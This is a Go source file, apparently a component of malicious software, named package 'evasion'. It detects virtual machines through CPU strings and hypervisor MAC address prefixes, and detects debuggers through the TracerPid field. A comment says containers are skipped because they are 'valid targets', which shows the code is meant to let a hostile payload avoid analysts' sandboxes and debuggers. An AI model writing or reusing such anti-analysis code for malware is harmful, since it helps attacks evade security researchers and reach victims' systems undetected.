package evasion

import (
	"net"
	"os"
	"runtime"
	"strings"
)

// Known VM/hypervisor MAC OUI prefixes
var vmMACs = []string{
	"00:0c:29", // VMware Workstation
	"00:50:56", // VMware ESX
	"08:00:27", // VirtualBox
	"52:54:00", // QEMU/KVM
	"00:16:3e", // Xen
}

// DetectVM checks for hypervisor indicators via cpuinfo and NIC MACs.
// Intentionally skips container cgroup check — containers are valid targets.
func DetectVM() bool {
	if runtime.GOOS == "linux" {
		return detectLinuxVM()
	}
	return false
}

func detectLinuxVM() bool {
	cpuinfo, err := os.ReadFile("/proc/cpuinfo")
	if err == nil {
		lower := strings.ToLower(string(cpuinfo))
		for _, kw := range []string{"qemu", "vmware"} {
			if strings.Contains(lower, kw) {
				return true
			}
		}
	}

	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			mac := strings.ToLower(iface.HardwareAddr.String())
			for _, prefix := range vmMACs {
				if strings.HasPrefix(mac, prefix) {
					return true
				}
			}
		}
	}

	return false
}

// DetectDebugger inspects TracerPid in /proc/self/status (Linux ptrace check).
func DetectDebugger() bool {
	if runtime.GOOS != "linux" {
		return false
	}
	status, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(status), "\n") {
		if strings.HasPrefix(line, "TracerPid:") {
			fields := strings.Fields(line)
			if len(fields) == 2 && fields[1] != "0" {
				return true
			}
		}
	}
	return false
}
